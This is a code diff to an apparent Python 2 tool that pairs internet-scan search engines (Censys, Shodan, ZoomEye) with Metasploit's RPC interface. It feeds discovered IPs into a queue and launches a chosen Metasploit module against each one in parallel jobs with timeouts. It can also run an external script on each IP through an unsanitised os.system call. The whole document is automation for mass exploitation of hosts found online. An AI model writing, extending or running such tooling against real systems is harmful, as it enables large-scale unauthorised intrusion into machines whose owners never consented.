@@ -1,7 +1,10 @@
 import msfrpc
 from censys import Censys
+from shodan import Shodan
+from zoomeye import Zoomeye
 from Queue import Queue
 from time import sleep
+from time import time
 import re
 import optparse
 import os
@@ -15,10 +18,11 @@ class MyMsf(object):
         self.query = None
         self.search = None
         self.page = 10
-        self.lock = threading.Lock()
-        self.thread_count = 10
         self.STOP_ME = [False]
         self.queue = Queue()
+        self.module = None
+        self.moduleType = None
+        self.opts = {}
     
     def login(self):
         """Login the msf client"""
@@ -49,30 +53,31 @@ class MyMsf(object):
             return {'prompt': '', 'busy': False, 'data': 'PAGE => %d\n' % self.page}
         else:
             if command == "exploit\n" or command == "run\n":
-                result_file = open("result.txt", "w")
-                self.thread_count = thread_num
                 if not self.search:
                     print "please select a search engine using the -s or --search option."
                     sys.exit()
                 elif self.query:
-                    self.search.getConfig()
-                    threads = []
-                    t1 = threading.Thread(target = self.search.searchIP, args = (self.query, self.page, self.queue, self.STOP_ME))
-                    threads.append(t1)
-                    t2 = threading.Thread(target=self.exploit, args=(file_name, command, result_file, thread_num))
-                    threads.append(t2)
-                    for t in threads:
-                        t.setDaemon(True)
-                        t.start()
+                    if self.module and self.moduleType:
+                        self.search.getConfig()
+                        threads = []
+                        t1 = threading.Thread(target = self.search.searchIP, args = (self.query, self.page, self.queue, self.STOP_ME))
+                        threads.append(t1)
+                        t2 = threading.Thread(target=self.DoExploit, args=(file_name, command, thread_num))
+                        threads.append(t2)
+                        for t in threads:
+                            t.setDaemon(True)
+                            t.start()
 
-                    for t in threads:
-                        t.join()
-
+                        for t in threads:
+                            t.join()
                     result = {'prompt': '', 'busy': False, 'data': '\n'}
                 else:
-                    return {'prompt': '', 'busy': False, 'data': 'QUERY must be setted'}
+                    return {'prompt': '', 'busy': False, 'data': 'QUERY must be setted\n'}
             else:
-                self.client.call('console.write', [self.console_id, command])
+                isSuccess = self.client.call('console.write', [self.console_id, command])
+                if isSuccess.has_key('error'):
+                    self.login()
+                    self.client.call('console.write', [self.console_id, command])
                 sleep(0.5)
                 result = self.client.call('console.read', [self.console_id])
                 while result['busy']:
@@ -86,11 +91,20 @@ class MyMsf(object):
                         result['data'] = "%s   FILE              %s\n" % (result['data'], file_name)
                     result['data'] = "%s   QUERY             %s\n" % (result['data'], self.query)
                     result['data'] = "%s   PAGE              %s\n" % (result['data'], self.page)
+
+                if command.startswith("use"):
+                    module = command.split(' ')[1].strip()
+                    self.moduleType = module[:module.find('/')]
+                    self.module = module[module.find('/')+1:]
+
+                if command.startswith("set"):
+                    options = command.split(' ')
+                    self.opts[options[1]] = options[2].strip()
             
             return result
     
     def setQuery(self, command):
-        r_query = r"set query ([\w\.:]+)\n"
+        r_query = r"set query (.+?)\n"
         query = re.search(r_query, command, re.I)
         if query:
             self.query = query.groups()[0]
@@ -107,71 +121,47 @@ class MyMsf(object):
         else:
             return False
 
-    def exploit(self, file_name, command, result_file, thread_num):
-        exploitThreads = []
-        for i in range(thread_num):
-            t = threading.Thread(target = self.DoExploit, args = (file_name, command, result_file))
-            exploitThreads.append(t)
-        
-        for t in exploitThreads:
-            t.setDaemon(True)
-            t.start()
-
-        for t in exploitThreads:
-            t.join()
-
-        while self.thread_count > 1:
-            try:
-                sleep(1.0)
-            except KeyboardInterrupt,e:
-                print '[WARNING] User aborted, wait all slave threads to exit...'
-                self.STOP_ME[0] = True
-
-    def DoExploit(self, file_name, command, result_file):
+    def DoExploit(self, file_name, command, thread_num):
         while not self.STOP_ME[0]:
             while not self.queue.empty():
-                self.lock.acquire()
                 ip = self.queue.get()
-                self.lock.release()
                 result_str = ""
                 if file_name:
                     os.system("python %s %s" % (file_name, ip))
                 else:
-                    self.lock.acquire()
-                    self.client.call('console.write', [self.console_id, 'set RHOSTS %s\n' % ip])
-                    sleep(0.5)
-                    self.client.call('console.read', [self.console_id])
-                    self.client.call('console.write', [self.console_id, 'set RHOST %s\n' % ip])
-                    sleep(0.5)
-                    self.client.call('console.read', [self.console_id])
-                    self.client.call('console.write', [self.console_id, command])
-                    sleep(1)
-                    result = self.client.call('console.read', [self.console_id])
-                    timeout = 0
-                    print result
-                    while result['busy']:
-                        if result['data']:
-                            print result['data']
-                            result_str = result_str + result['data']
-                        sleep(2)
-                        result = self.client.call('console.read', [self.console_id])
-                        timeout = timeout + 2
-                        if timeout == 50:
-                            break
+                    while len(self.client.call('job.list', [])) >= thread_num:
+                        sleep(1)
+                        self.isTimeout(self.client.call('job.list', []))
+                    
+                    self.opts['RHOSTS'] = ip
+                    self.opts['RHOST'] = ip
+                    print "detecting %s" % ip
+                    opts = self.client.call('module.execute', [self.moduleType, self.module, self.opts])
+            
+        while self.client.call('job.list', []):
+            sleep(1)
+            self.isTimeout(self.client.call('job.list', []))
+            
+        print "Done!\n"
+        print "using creds, services, vulns .etc commands to see specific informations,\ntype help to see the details."
 
-                    if result['data']:
-                        print result['data']
-                        result_str = result_str + result['data']
-                    self.lock.release()
-                
-                if result_str:
-                    self.lock.acquire()
-                    result_file.write("%s\n" % result_str)
-                    self.lock.release()
-        
-        self.lock.acquire()
-        self.thread_count -= 1
-        self.lock.release()
+    def isTimeout(self, job_list):
+        for job_id in job_list.keys():
+            print "the job id is %s" % job_id
+            try:
+                job_info = self.client.call('job.info', [int(job_id),])
+            except:
+                self.login()
+                job_info = self.client.call('job.info', [int(job_id),])
+            
+            if job_info.has_key('error_message') and job_info['error_message'] == 'Invalid Job':
+                continue
+            elif job_info.has_key('error'):
+                print job_info['error_message']
+                sys.exit()
+            used_time = time() - job_info['start_time']
+            if used_time > 60:
+                self.client.call('job.stop', [int(job_id),])
 
 class Operate(object):
     def __init__(self):
